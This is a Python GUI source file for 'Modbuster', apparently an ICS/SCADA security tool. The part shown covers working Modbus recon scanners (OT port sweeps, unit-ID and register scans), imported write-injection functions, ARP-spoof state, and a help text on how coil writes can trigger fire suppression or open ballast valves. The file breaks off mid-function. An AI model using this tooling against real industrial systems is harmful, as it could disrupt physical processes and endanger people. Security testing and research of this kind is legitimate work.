"""
Modbuster GUI: Analyze (PCAP/live), Inject, Replay.
Uses customtkinter for a modern look.
"""

import queue
import statistics
import time
import threading
import tkinter as tk
import tkinter.filedialog
from pathlib import Path
from typing import Any, List, Optional, Tuple

import customtkinter as ctk

from modbuster.capture import iter_live, iter_pcap
from modbuster.export import export_csv, export_json
from modbuster.inference import InferenceEngine, HIGH, MEDIUM
import modbuster.report as _report
from modbuster.interpreter import format_line
from modbuster.inject import (
    inject_modbus_read_holding,
    inject_modbus_read_coils,
    inject_modbus_write_register,
    inject_modbus_write_multiple_registers,
    inject_modbus_write_single_coil,
)
from modbuster.replay import get_messages_from_pcap, replay_one


# Theme — CT Cubed: orange accent on dark gray
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme(str(Path(__file__).parent / "theme_ctcubed.json"))

# CT Cubed brand colors
_ORANGE       = "#ff6900"
_ORANGE_HOVER = "#cc5500"
_RED_FG       = "#a02020"
_RED_HOVER    = "#c03030"
_PANEL_BG     = ("#e8e8e8", "#1e1e1e")
_MAP_BG       = ("#dedede", "#252525")
_MUTED        = ("gray45", "gray55")
_NEUTRAL_BTN  = ("gray55", "gray28")
_NEUTRAL_HOV  = ("gray45", "gray38")
_DROPDOWN_BG  = ("gray75", "#2a2a2a")
_CODE_FG      = "#e0e0e0"

# SCADA protocols and default ports (from plan); all selected by default for live monitor
SCADA_PORTS = [
    ("Modbus TCP",        502,   "tcp"),
    ("DNP3",              20000, "tcp"),
    ("IEC 60870-5-104",   2404,  "tcp"),
    ("BACnet",            47808, "udp"),
    ("EtherNet/IP (CIP)", 44818, "tcp"),
    ("NMEA 0183",         10110, "tcp"),
    ("S7comm (Siemens)",  102,   "tcp"),
]


def _get_network_interfaces() -> List[Tuple[str, str]]:
    """
    Return list of (display_name, device_name) for live capture.
    display_name is human-readable (e.g. "Ethernet", "Wi-Fi"); device_name is what Scapy expects.
    """
    import sys
    try:
        from scapy.arch import get_if_list
        raw_list = list(get_if_list())
    except Exception:
        return []

    if not raw_list:
        return []

    # Windows: resolve \Device\NPF_{GUID} to friendly names from registry
    if sys.platform == "win32":
        friendly_map = _windows_friendly_interface_names()
        result = []
        seen = set()
        for device in raw_list:
            display = friendly_map.get(device) or _shorten_device_name(device)
            if display in seen:
                display = f"{display} ({device})"
            seen.add(display)
            result.append((display, device))
        return result

    # Linux: use interface name (eth0, wlan0, etc.); optionally add alias if set
    if sys.platform.startswith("linux"):
        friendly_map = _linux_friendly_interface_names(raw_list)
        result = []
        seen = set()
        for device in raw_list:
            display = friendly_map.get(device) or device
            if display in seen:
                display = f"{display} ({device})"
            seen.add(display)
            result.append((display, device))
        return result

    # macOS / other: names are usually readable (en0, etc.)
    return [(name, name) for name in raw_list]


def _linux_friendly_interface_names(iface_list: List[str]) -> dict:
    """On Linux, map interface name to a friendlier label (e.g. from /sys ifalias)."""
    out = {}
    for iface in iface_list:
        try:
            alias_path = Path("/sys/class/net") / iface / "ifalias"
            if alias_path.is_file():
                alias = alias_path.read_text().strip()
                if alias:
                    out[iface] = f"{alias} ({iface})"
        except (OSError, ValueError):
            pass
        # If no alias, we'll use the interface name as display (eth0, wlan0 are already readable)
    return out


def _windows_friendly_interface_names() -> dict:
    """Map Windows NPF device name (e.g. \\Device\\NPF_{GUID}) to friendly name via registry."""
    out = {}
    try:
        import winreg
        # Network connections: HKLM\SYSTEM\CurrentControlSet\Control\Network\{class}\{GUID}\Connection -> Name
        net_class = "{4d36e972-e325-11ce-bfc1-08002be10318}"  # Network adapters
        key_path = f"SYSTEM\\CurrentControlSet\\Control\\Network\\{net_class}"
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ
        ) as class_key:
            for i in range(winreg.QueryInfoKey(class_key)[0]):
                try:
                    guid = winreg.EnumKey(class_key, i)
                    conn_path = f"{key_path}\\{guid}\\Connection"
                    with winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE, conn_path, 0, winreg.KEY_READ
                    ) as conn_key:
                        name, _ = winreg.QueryValueEx(conn_key, "Name")
                        if name:
                            # Scapy/Npcap use \Device\NPF_{GUID}; registry guid usually has braces
                            out[f"\\Device\\NPF_{guid}"] = name
                            out[f"\\Device\\NPF_{guid.upper()}"] = name
                except (FileNotFoundError, OSError):
                    continue
    except Exception:
        pass
    return out


def _shorten_device_name(device: str) -> str:
    r"""Turn \Device\NPF_{GUID} into something shorter for display when no friendly name."""
    if not device:
        return device
    if "Loopback" in device:
        return "Loopback"
    if "NPF_" in device:
        idx = device.find("{")
        if idx != -1:
            return "Adapter " + device[idx:idx+9] + "..."  # e.g. "Adapter {1D3A11E1..."
    return device[:30] + "..." if len(device) > 30 else device


def _build_bpf_from_ports(port_vars: List[Any]) -> str:
    """Build BPF filter from SCADA_PORTS and the given checkbox vars (True = selected)."""
    parts = []
    for (_, port, proto), var in zip(SCADA_PORTS, port_vars):
        if var.get():
            parts.append(f"{proto} port {port}")
    if not parts:
        return "tcp port 502"  # fallback to Modbus only
    return " or ".join(parts)


class TrendWindow:
    """Floating popup showing a live line chart for a single register."""

    _CH_BG   = "#141414"
    _CH_GRID = "#2a2a2a"
    _CH_TEXT = "#909090"
    _CH_LINE = "#ff6900"
    _W, _H   = 500, 260   # canvas dimensions
    _PAD     = (55, 14, 18, 38)  # left, right, top, bottom

    def __init__(self, parent: ctk.CTk, engine: Any,
                 ip: str, unit_id: int, addr: int, rtype: str, hint: str) -> None:
        self._engine   = engine
        self.ip        = ip
        self.unit_id   = unit_id
        self.addr      = addr
        self.rtype     = rtype
        self.hint      = hint
        self.pinned    = False
        self._alive    = True

        self._parent = parent
        self.win = ctk.CTkToplevel(parent)
        self.win.resizable(True, False)
        self.win.protocol("WM_DELETE_WINDOW", self._on_close)
        self._build_ui()
        self._draw()
        self._schedule()
        self.win.after(50, self._center)

    def _build_ui(self) -> None:
        win = self.win

        # ── Header row ───────────────────────────────────────────────────────
        hdr = ctk.CTkFrame(win, fg_color="transparent")
        hdr.pack(fill="x", padx=12, pady=(10, 2))

        self._title_lbl = ctk.CTkLabel(hdr, text=self._make_title(),
                                       font=("", 12, "bold"), text_color=_ORANGE, anchor="w")
        self._title_lbl.pack(side="left")

        self._pin_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(hdr, text="Pin", variable=self._pin_var, width=60,
                        command=lambda: setattr(self, "pinned", self._pin_var.get())
                        ).pack(side="right")

        # ── Canvas ───────────────────────────────────────────────────────────
        self._canvas = tk.Canvas(win, width=self._W, height=self._H,
                                 bg=self._CH_BG, highlightthickness=0)
        self._canvas.pack(padx=12, pady=(4, 2))

        # ── Stats row ────────────────────────────────────────────────────────
        self._stats_var = ctk.StringVar(value="")
        ctk.CTkLabel(win, textvariable=self._stats_var,
                     font=("Consolas", 10), text_color=_MUTED).pack(pady=(0, 10))

        self._update_title()

    def _make_title(self) -> str:
        return f"{self.ip}  ·  unit {self.unit_id}  ·  addr {self.addr}  —  {self.rtype}"

    def _update_title(self) -> None:
        self.win.title(f"Trend  {self.ip} / u{self.unit_id} / a{self.addr}")
        self._title_lbl.configure(text=self._make_title())

    def retarget(self, ip: str, unit_id: int, addr: int, rtype: str, hint: str) -> None:
        self.ip, self.unit_id, self.addr = ip, unit_id, addr
        self.rtype, self.hint = rtype, hint
        self._update_title()
        self._draw()
        self.win.lift()

    def _on_close(self) -> None:
        self._alive = False
        self.win.destroy()

    def _center(self) -> None:
        self.win.update_idletasks()
        w = self._W + 36          # canvas width + padding
        h = self.win.winfo_reqheight()
        x = self._parent.winfo_x() + (self._parent.winfo_width()  - w) // 2
        y = self._parent.winfo_y() + (self._parent.winfo_height() - h) // 2
        self.win.geometry(f"{w}x{h}+{x}+{y}")
        self.win.lift()
        self.win.focus_force()

    def _schedule(self) -> None:
        if self._alive:
            self.win.after(3000, self._refresh)

    def _refresh(self) -> None:
        if not self._alive:
            return
        self._draw()
        self._schedule()

    def _draw(self) -> None:
        c = self._canvas
        c.delete("all")
        W, H = self._W, self._H
        PL, PR, PT, PB = self._PAD
        cx1, cy1 = PL, PT
        cx2, cy2 = W - PR, H - PB
        cw, ch   = cx2 - cx1, cy2 - cy1

        # Background rect
        c.create_rectangle(cx1, cy1, cx2, cy2, fill=self._CH_BG, outline=self._CH_GRID)

        times, values = self._engine.get_history(self.ip, self.unit_id, self.addr)

        if len(values) < 2:
            c.create_text(W // 2, H // 2, text="Not enough data yet — keep capture running.",
                          fill=self._CH_TEXT, font=("Consolas", 10))
            self._stats_var.set("")
            return

        mn, mx = min(values), max(values)
        span = mx - mn if mx != mn else 1
        pad  = span * 0.12
        y_lo, y_hi = mn - pad, mx + pad

        # Horizontal grid lines + Y labels
        for i in range(5):
            gy  = cy1 + ch * i // 4
            val = y_hi - (y_hi - y_lo) * i / 4
            c.create_line(cx1, gy, cx2, gy, fill=self._CH_GRID)
            c.create_text(cx1 - 4, gy, text=f"{val:.0f}",
                          fill=self._CH_TEXT, font=("Consolas", 8), anchor="e")

        # X axis time labels
        now = time.time()
        t0  = times[0]
        for i in range(5):
            gx  = cx1 + cw * i // 4
            age = now - (t0 + (times[-1] - t0) * i / 4)
            if i == 4:
                lbl = "now"
            elif age < 60:
                lbl = f"-{int(age)}s"
            elif age < 3600:
                lbl = f"-{int(age/60)}m"
            else:
                lbl = f"-{int(age/3600)}h"
            c.create_line(gx, cy1, gx, cy2, fill=self._CH_GRID)
            c.create_text(gx, cy2 + 12, text=lbl,
                          fill=self._CH_TEXT, font=("Consolas", 8), anchor="center")

        # Data line
        n = len(values)
        pts: List[float] = []
        for i, v in enumerate(values):
            x = cx1 + cw * i / (n - 1)
            y = cy1 + ch * (1.0 - (v - y_lo) / (y_hi - y_lo))
            pts.extend([x, y])

        c.create_line(*pts, fill=self._CH_LINE, width=2, smooth=False)

        # Current value dot
        c.create_oval(pts[-2] - 4, pts[-1] - 4,
                      pts[-2] + 4, pts[-1] + 4,
                      fill=self._CH_LINE, outline="")

        # Stats
        std = statistics.stdev(values) if len(values) >= 2 else 0.0
        self._stats_var.set(
            f"Current: {values[-1]}    Min: {mn}    Max: {mx}"
            f"    σ: {std:.1f}    Samples: {n}"
        )


class ModbusterApp(ctk.CTk):
    def __init__(self) -> None:
        super().__init__()
        self.title("Modbuster — SCADA Traffic Analysis & Injection")
        self.geometry("900x780")
        self.minsize(700, 660)

        self._analyze_records: List[dict] = []
        self._raw_packets: list = []   # raw Scapy packets — for PCAP export
        self._live_running = False
        self._msg_queue: queue.Queue = queue.Queue()

        # Discovered hosts: controllers (masters) and field devices (slaves)
        self._controllers: set = set()
        self._field_devices: set = set()

        # Register inference engine
        self._inference = InferenceEngine()

        # Stop flags and running state for Recon scanners
        self._recon_stop = threading.Event()

        # Track (ip, unit_id, addr) triples successfully written this session
        self._inject_written: set[Tuple[str, int, int]] = set()

        # Open trend-chart popups
        self._trend_windows: List[TrendWindow] = []

        # Persistent target state shown in the bottom bar
        self._target_ip:   str           = ""
        self._target_unit: Optional[int] = None
        self._target_addr: Optional[int] = None
        self._suppress_clicks = False   # brief guard after popup close
        self._recon_hd_running = False
        self._recon_uid_running = False
        self._recon_reg_running = False

        # ARP spoof state
        self._arp_stop_event = threading.Event()
        self._arp_running = False

        self._build_ui()
        self._poll_queue()

    def _build_ui(self) -> None:
        self.tabs = ctk.CTkTabview(self, width=880, height=560)
        self.tabs.pack(fill="both", expand=True, padx=10, pady=10)
        self.tabs.add("Analyze")
        self.tabs.add("Infer")
        self.tabs.add("Recon")
        self.tabs.add("Inject")
        self.tabs.add("Attacks")

        self._build_analyze_tab()
        self._build_infer_tab()
        self._build_recon_tab()
        self._build_inject_tab()
        self._build_attack_tab()

        bar = ctk.CTkFrame(self, fg_color=_PANEL_BG, corner_radius=6)
        bar.pack(fill="x", padx=10, pady=(0, 8))
        ctk.CTkLabel(bar, text="TARGET", font=("", 11, "bold"),
                     text_color=_ORANGE, anchor="w").pack(side="left", padx=(12, 8), pady=8)
        self._target_label = ctk.CTkLabel(bar, text="—  no target selected",
                                          font=("Consolas", 11), text_color=_CODE_FG, anchor="w",
                                          cursor="hand2")
        self._target_label.pack(side="left", pady=8)
        self._target_label.bind("<Button-1>", lambda e: self._edit_target())

        import socket as _socket
        try:
            with _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM) as _s:
                _s.connect(("10.255.255.255", 1))
                _local_ip = _s.getsockname()[0]
        except Exception:
            _local_ip = "—"
        self._local_ip = _local_ip
        self._host_label = ctk.CTkLabel(bar, text=f"Host:  {_local_ip}",
                                        font=("Consolas", 11), text_color=_MUTED, anchor="center")
        self._host_label.pack(side="left", fill="x", expand=True, pady=8)

        ctk.CTkButton(bar, text="Generate Report", width=130, height=28,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      command=self._generate_report).pack(side="right", padx=(4, 12), pady=6)
        self.status = ctk.CTkLabel(bar, text="Not Capturing", font=("", 11),
                                   text_color=_MUTED, anchor="e")
        self.status.pack(side="right", padx=(4, 4), pady=8)

    # ── Recon Tab ─────────────────────────────────────────────────────────────

    def _show_help(self, title: str, text: str) -> None:
        """Show a small popup centered on the main window."""
        win = ctk.CTkToplevel(self)
        win.title(title)
        win.resizable(False, False)
        ctk.CTkLabel(win, text=title, font=("", 13, "bold"), anchor="w").pack(
            fill="x", padx=16, pady=(14, 4))
        ctk.CTkLabel(win, text=text, font=("", 11), text_color=_MUTED,
                     anchor="w", justify="left", wraplength=448).pack(
            fill="x", padx=16, pady=(0, 10))
        ctk.CTkButton(win, text="Close", width=80, command=win.destroy).pack(pady=(0, 14))
        # Center on main window after widgets are laid out
        def _center():
            win.update_idletasks()
            w, h = 480, win.winfo_reqheight()
            x = self.winfo_x() + (self.winfo_width() - w) // 2
            y = self.winfo_y() + (self.winfo_height() - h) // 2
            win.geometry(f"{w}x{h}+{x}+{y}")
            win.lift()
            win.focus_force()
            win.grab_set()
        win.after(50, _center)

    def _open_trend(self, ip: str, unit_id: int, addr: int,
                    rtype: str, hint: str) -> None:
        """Open or reuse a TrendWindow for the given register."""
        # Clean up dead windows
        self._trend_windows = [t for t in self._trend_windows if t._alive]
        # Reuse the first unpinned window
        for tw in self._trend_windows:
            if not tw.pinned:
                tw.retarget(ip, unit_id, addr, rtype, hint)
                return
        # All pinned (or none open) — open a new one
        tw = TrendWindow(self, self._inference, ip, unit_id, addr, rtype, hint)
        self._trend_windows.append(tw)

    def _show_fc_help(self) -> None:
        """Popup explaining when to use each Modbus function code."""
        win = ctk.CTkToplevel(self)
        win.title("Modbus Function Code Guide")
        win.resizable(False, False)

        entries = [
            ("FC6 — Write Single Register",
             "Write one 16-bit holding register. Use this to change a single setpoint, "
             "speed command, or configuration value. The most common write used in OT attacks "
             "because most PLC outputs are holding registers. Example: set engine RPM setpoint."),
            ("FC16 — Write Multiple Registers",
             "Write a block of consecutive holding registers in one packet. Use this when a "
             "command requires multiple values to be updated atomically — e.g. setting port and "
             "starboard engine RPM together, or writing a multi-word floating-point value split "
             "across two registers."),
            ("FC5 — Write Single Coil",
             "Write a single binary output (ON = 0xFF00, OFF = 0x0000). Coils represent physical "
             "actuators: relays, valves, pump switches, alarm resets, fire suppression triggers. "
             "FC5 is the most dangerous function code in safety-critical systems — a single bit "
             "can activate a CO2 suppression system, open a ballast valve, or kill a bilge pump. "
             "Always confirm the coil map before sending."),
            ("FC1 — Read Coils",
             "Read the current state of binary outputs. Use this before writing coils so you know "
             "the current state and can avoid unintended changes. Also useful for enumerating "
             "which coil addresses a device responds to — non-existent addresses return an "
             "exception, valid ones return 0 or 1."),
        ]

        frame = ctk.CTkScrollableFrame(win, width=500, height=360, fg_color="transparent")
        frame.pack(fill="both", expand=True, padx=12, pady=(12, 4))

        for title, body in entries:
            ctk.CTkLabel(frame, text=title, font=("", 12, "bold"),
                         anchor="w", text_color=_ORANGE).pack(fill="x", pady=(10, 2))
            ctk.CTkLabel(frame, text=body, font=("", 11), text_color=_MUTED,
                         anchor="w", justify="left", wraplength=480).pack(fill="x", padx=(8, 0))

        ctk.CTkButton(win, text="Close", width=80, command=win.destroy).pack(pady=(4, 12))

        def _center():
            win.update_idletasks()
            w, h = 520, 460
            x = self.winfo_x() + (self.winfo_width() - w) // 2
            y = self.winfo_y() + (self.winfo_height() - h) // 2
            win.geometry(f"{w}x{h}+{x}+{y}")
            win.lift()
            win.focus_force()
            win.grab_set()
        win.after(50, _center)

    def _build_recon_tab(self) -> None:
        top = self.tabs.tab("Recon")

        # ── Host Discovery ────────────────────────────────────────────────────
        hd_frame = ctk.CTkFrame(top, fg_color=_PANEL_BG, corner_radius=6)
        hd_frame.pack(fill="x", pady=(0, 6))
        hd_header = ctk.CTkFrame(hd_frame, fg_color="transparent")
        hd_header.pack(fill="x", padx=8, pady=(6, 0))
        ctk.CTkLabel(hd_header, text="HOST DISCOVERY", font=("", 11, "bold"), anchor="w").pack(side="left")
        ctk.CTkButton(
            hd_header, text="?", width=22, height=22, font=("", 11, "bold"),
            fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
            command=lambda: self._show_help(
                "Host Discovery",
                "TCP-probes a subnet for live OT devices and identifies open service ports on each host.\n\n"
                "Note: Modbus masters and HMIs make outbound connections — they will NOT appear here.\n\n"
                "Scanning ports:  502 (Modbus TCP)  |  44818 (EtherNet/IP)  |  20000 (DNP3)  |  "
                "2404 (IEC 60870-5-104)  |  10110 (NMEA 0183)  |  102 (S7comm)  |  47808 UDP (BACnet)"
            )
        ).pack(side="left", padx=(6, 0))
        hd_row = ctk.CTkFrame(hd_frame, fg_color="transparent")
        hd_row.pack(fill="x", padx=8, pady=(4, 8))
        ctk.CTkLabel(hd_row, text="Subnet:").pack(side="left", padx=(0, 6))
        self._recon_subnet = ctk.CTkEntry(hd_row, width=180, placeholder_text="172.20.0.0/24")
        self._recon_subnet.pack(side="left", padx=4)
        self._recon_hd_btn = ctk.CTkButton(hd_row, text="Scan", width=80, command=self._start_host_discovery)
        self._recon_hd_btn.pack(side="left", padx=4)
        self._recon_hd_status = ctk.CTkLabel(hd_row, text="", font=("", 10), text_color=_MUTED, anchor="w")
        self._recon_hd_status.pack(side="left", padx=8)

        # ── Unit ID Scanner ───────────────────────────────────────────────────
        uid_frame = ctk.CTkFrame(top, fg_color=_PANEL_BG, corner_radius=6)
        uid_frame.pack(fill="x", pady=(0, 6))
        uid_header = ctk.CTkFrame(uid_frame, fg_color="transparent")
        uid_header.pack(fill="x", padx=8, pady=(6, 0))
        ctk.CTkLabel(uid_header, text="UNIT ID SCAN  (Modbus)", font=("", 11, "bold"), anchor="w").pack(side="left")
        ctk.CTkButton(
            uid_header, text="?", width=22, height=22, font=("", 11, "bold"),
            fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
            command=lambda: self._show_help(
                "Unit ID Scan",
                "Sweeps all 247 Modbus unit IDs on a single target IP.\n\n"
                "Reveals hidden or undocumented devices sharing the same IP address — "
                "common in serial-to-Ethernet gateways that bridge multiple field devices onto one connection.\n\n"
                "A 'gateway present' response means the gateway exists but the unit is not reachable on its serial bus."
            )
        ).pack(side="left", padx=(6, 0))
        uid_row = ctk.CTkFrame(uid_frame, fg_color="transparent")
        uid_row.pack(fill="x", padx=8, pady=(4, 8))
        ctk.CTkLabel(uid_row, text="Target:").pack(side="left", padx=(0, 6))
        self._recon_uid_target = ctk.CTkEntry(uid_row, width=160, placeholder_text="192.168.1.10")
        self._recon_uid_target.pack(side="left", padx=4)
        ctk.CTkLabel(uid_row, text="Port:").pack(side="left", padx=(12, 4))
        self._recon_uid_port = ctk.CTkEntry(uid_row, width=65)
        self._recon_uid_port.insert(0, "502")
        self._recon_uid_port.pack(side="left", padx=4)
        self._recon_uid_btn = ctk.CTkButton(uid_row, text="Scan", width=80, command=self._start_uid_scan)
        self._recon_uid_btn.pack(side="left", padx=12)
        self._recon_uid_status = ctk.CTkLabel(uid_row, text="", font=("", 10), text_color=_MUTED, anchor="w")
        self._recon_uid_status.pack(side="left", padx=8)

        # ── Register Scanner ──────────────────────────────────────────────────
        reg_frame = ctk.CTkFrame(top, fg_color=_PANEL_BG, corner_radius=6)
        reg_frame.pack(fill="x", pady=(0, 6))
        reg_header = ctk.CTkFrame(reg_frame, fg_color="transparent")
        reg_header.pack(fill="x", padx=8, pady=(6, 0))
        ctk.CTkLabel(reg_header, text="REGISTER SCAN  (Modbus FC3)", font=("", 11, "bold"), anchor="w").pack(side="left")
        ctk.CTkButton(
            reg_header, text="?", width=22, height=22, font=("", 11, "bold"),
            fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
            command=lambda: self._show_help(
                "Register Scan",
                "Reads holding registers (FC3) across a specified address range on a target device.\n\n"
                "Maps which addresses respond and their current values. "
                "Consecutive zero-value registers are compressed into a single summary line.\n\n"
                "Feed the results into the Infer tab to classify register types (RPM, temperature, setpoint, etc.)."
            )
        ).pack(side="left", padx=(6, 0))
        reg_row = ctk.CTkFrame(reg_frame, fg_color="transparent")
        reg_row.pack(fill="x", padx=8, pady=(4, 8))
        ctk.CTkLabel(reg_row, text="Target:").pack(side="left", padx=(0, 6))
        self._recon_reg_target = ctk.CTkEntry(reg_row, width=160, placeholder_text="192.168.1.10")
        self._recon_reg_target.pack(side="left", padx=4)
        ctk.CTkLabel(reg_row, text="Port:").pack(side="left", padx=(8, 4))
        self._recon_reg_port = ctk.CTkEntry(reg_row, width=65)
        self._recon_reg_port.insert(0, "502")
        self._recon_reg_port.pack(side="left", padx=4)
        ctk.CTkLabel(reg_row, text="Unit:").pack(side="left", padx=(8, 4))
        self._recon_reg_unit = ctk.CTkEntry(reg_row, width=50)
        self._recon_reg_unit.insert(0, "1")
        self._recon_reg_unit.pack(side="left", padx=4)
        ctk.CTkLabel(reg_row, text="Start:").pack(side="left", padx=(8, 4))
        self._recon_reg_start = ctk.CTkEntry(reg_row, width=65)
        self._recon_reg_start.insert(0, "0")
        self._recon_reg_start.pack(side="left", padx=4)
        ctk.CTkLabel(reg_row, text="End:").pack(side="left", padx=(8, 4))
        self._recon_reg_end = ctk.CTkEntry(reg_row, width=65)
        self._recon_reg_end.insert(0, "1000")
        self._recon_reg_end.pack(side="left", padx=4)
        self._recon_reg_btn = ctk.CTkButton(reg_row, text="Scan", width=80, command=self._start_register_scan)
        self._recon_reg_btn.pack(side="left", padx=12)
        self._recon_reg_status = ctk.CTkLabel(reg_row, text="", font=("", 10), text_color=_MUTED, anchor="w")
        self._recon_reg_status.pack(side="left", padx=8)

        # ── Results log ───────────────────────────────────────────────────────
        ctk.CTkLabel(top, text="RESULTS", font=("", 10, "bold"), text_color=_MUTED, anchor="w").pack(
            fill="x", padx=2, pady=(4, 0))
        self._recon_log = ctk.CTkTextbox(top, font=("Consolas", 10), wrap="none",
                                         fg_color=_PANEL_BG, text_color=_CODE_FG,
                                         activate_scrollbars=True)
        self._recon_log.pack(fill="both", expand=True, pady=(2, 0))
        ctk.CTkButton(top, text="Clear Results", width=110, height=24,
                      fg_color=_NEUTRAL_BTN, hover_color=_NEUTRAL_HOV,
                      command=lambda: self._recon_log.delete("1.0", "end")).pack(anchor="e", pady=(4, 0))

    def _stop_recon(self) -> None:
        self._recon_stop.set()

    def _set_recon_btn_scanning(self, btn: Any) -> None:
        btn.configure(text="Stop", fg_color=_RED_FG, hover_color=_RED_HOVER)

    def _set_recon_btn_idle(self, btn: Any) -> None:
        btn.configure(text="Scan", fg_color=_ORANGE, hover_color=_ORANGE_HOVER)

    def _recon_append(self, line: str) -> None:
        self._msg_queue.put(("recon_append", line))

    def _start_host_discovery(self) -> None:
        if self._recon_hd_running:
            self._recon_stop.set()
            return
        import ipaddress
        subnet_str = self._recon_subnet.get().strip()
        if not subnet_str:
            self._recon_hd_status.configure(text="Enter a subnet.")
            return
        try:
            net = ipaddress.ip_network(subnet_str, strict=False)
        except ValueError as e:
            self._recon_hd_status.configure(text=f"Invalid: {e}")
            return
        self._recon_stop.clear()
        self._recon_hd_running = True
        self._set_recon_btn_scanning(self._recon_hd_btn)
        self._recon_append(f"\n── Host Discovery: {subnet_str} ──")
        threading.Thread(target=self._run_host_discovery, args=(net,), daemon=True).start()

    def _run_host_discovery(self, net) -> None:
        import socket
        # (port, service, protocol)
        OT_PORTS = [
            (502,   "Modbus TCP",       "tcp"),
            (44818, "EtherNet/IP",      "tcp"),
            (20000, "DNP3",             "tcp"),
            (2404,  "IEC 60870-5-104",  "tcp"),
            (10110, "NMEA 0183",        "tcp"),
            (102,   "S7comm (Siemens)", "tcp"),
            (47808, "BACnet",           "udp"),
        ]
        # Minimal BACnet Who-Is unicast probe (BVLC + NPDU + APDU)
        BACNET_WHOIS = bytes([
            0x81, 0x0a, 0x00, 0x08,        # BVLC: Original-Unicast-NPDU, length 8
            0x01, 0x00,                     # NPDU: version 1, no special
            0x10, 0x08,                     # APDU: Unconfirmed-Request, Who-Is
        ])
        hosts = list(net.hosts())
        found = 0
        for i, ip in enumerate(hosts):
            if self._recon_stop.is_set():
                self._msg_queue.put(("recon_status_hd", f"Stopped. {found} open port(s) found."))
                self._msg_queue.put(("recon_hd_done", None))
                return
            ip_str = str(ip)
            self._msg_queue.put(("recon_status_hd", f"Scanning {ip_str}… ({i+1}/{len(hosts)})"))
            for port, svc, proto in OT_PORTS:
                try:
                    if proto == "udp":
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.settimeout(0.6)
                        s.sendto(BACNET_WHOIS, (ip_str, port))
                        try:
                            s.recv(64)
                            self._recon_append(f"  OPEN   {ip_str}:{port:<6}  {svc} (UDP)")
                            found += 1
                        except socket.timeout:
                            pass  # no response — device absent or filtered
                        s.close()
                    else:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.4)
                        if s.connect_ex((ip_str, port)) == 0:
                            self._recon_append(f"  OPEN   {ip_str}:{port:<6}  {svc}")
                            found += 1
                        s.close()
                except Exception:
                    pass
        self._msg_queue.put(("recon_status_hd", f"Done — {found} open OT port(s) across {len(hosts)} hosts."))
        self._msg_queue.put(("recon_hd_done", None))

    def _start_uid_scan(self) -> None:
        if self._recon_uid_running:
            self._recon_stop.set()
            return
        target = self._recon_uid_target.get().strip()
        if not target:
            self._recon_uid_status.configure(text="Enter a target IP.")
            return
        try:
            port = int(self._recon_uid_port.get().strip() or "502")
        except ValueError:
            port = 502
        self._recon_stop.clear()
        self._recon_uid_running = True
        self._set_recon_btn_scanning(self._recon_uid_btn)
        self._recon_append(f"\n── Unit ID Scan: {target}:{port} ──")
        threading.Thread(target=self._run_uid_scan, args=(target, port), daemon=True).start()

    def _run_uid_scan(self, target: str, port: int) -> None:
        import socket

        def _fc3_packet(unit_id: int) -> bytes:
            return bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
                          unit_id & 0xFF, 0x03, 0x00, 0x00, 0x00, 0x01])

        found = []
        gw_run_start: Optional[int] = None
        gw_run_end:   Optional[int] = None

        def flush_gw_run() -> None:
            nonlocal gw_run_start, gw_run_end
            if gw_run_start is None:
                return
            n = gw_run_end - gw_run_start + 1  # type: ignore[operator]
            if n == 1:
                self._recon_append(f"  GATEWAY  Unit {gw_run_start:>3}        — gateway present, unit not on serial bus")
            else:
                self._recon_append(
                    f"  GATEWAY  Units {gw_run_start}–{gw_run_end}  [{n} units]  gateway present, none on serial bus")
            gw_run_start = gw_run_end = None

        for uid in range(1, 248):
            if self._recon_stop.is_set():
                flush_gw_run()
                self._msg_queue.put(("recon_status_uid", f"Stopped at unit {uid}. Found: {found}"))
                self._msg_queue.put(("recon_uid_done", None))
                return
            self._msg_queue.put(("recon_status_uid", f"Probing unit {uid}/247…"))
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((target, port))
                s.sendall(_fc3_packet(uid))
                resp = s.recv(256)
                s.close()
                if len(resp) >= 8:
                    func_byte = resp[7]
                    if func_byte == 0x03:
                        flush_gw_run()
                        self._recon_append(f"  FOUND    Unit {uid:>3}        — responding (FC3 OK)")
                        found.append(uid)
                    elif func_byte == 0x83:
                        exc = resp[8] if len(resp) > 8 else 0
                        if exc == 0x0b:
                            if gw_run_start is None:
                                gw_run_start = uid
                            gw_run_end = uid
                        elif exc == 0x0a:
                            flush_gw_run()
                            self._recon_append(f"  GATEWAY  Unit {uid:>3}        — gateway present, path unavailable")
                        else:
                            flush_gw_run()
                            self._recon_append(f"  FOUND    Unit {uid:>3}        — exception 0x{exc:02x} (device responded)")
                            found.append(uid)
                else:
                    flush_gw_run()
            except Exception:
                flush_gw_run()
        flush_gw_run()
        summary = f"Done. {len(found)} unit ID(s) found: {found}" if found else "Done. No responding units."
        self._msg_queue.put(("recon_status_uid", summary))
        self._recon_append(f"  → {summary}")
        self._msg_queue.put(("recon_uid_done", None))

    def _start_register_scan(self) -> None:
        if self._recon_reg_running:
            self._recon_stop.set()
            return
        target = self._recon_reg_target.get().strip()
        if not target:
            self._recon_reg_status.configure(text="Enter a target IP.")
            return
        try:
            port  = int(self._recon_reg_port.get().strip()  or "502")
            unit  = int(self._recon_reg_unit.get().strip()  or "1")
            start = int(self._recon_reg_start.get().strip() or "0")
            end   = int(self._recon_reg_end.get().strip()   or "1000")
        except ValueError:
            self._recon_reg_status.configure(text="Invalid input.")
            return
        self._recon_stop.clear()
        self._recon_reg_running = True
        self._set_recon_btn_scanning(self._recon_reg_btn)
        self._recon_append(f"\n── Register Scan: {target}:{port}  Unit {unit}  Addr {start}–{end} ──")
        self._recon_append(f"  {'Addr':>5}  {'Dec':>6}  Hex     Notes")
        self._recon_append(f"  {'─'*5}  {'─'*6}  {'─'*6}  {'─'*30}")
        threading.Thread(target=self._run_register_scan,
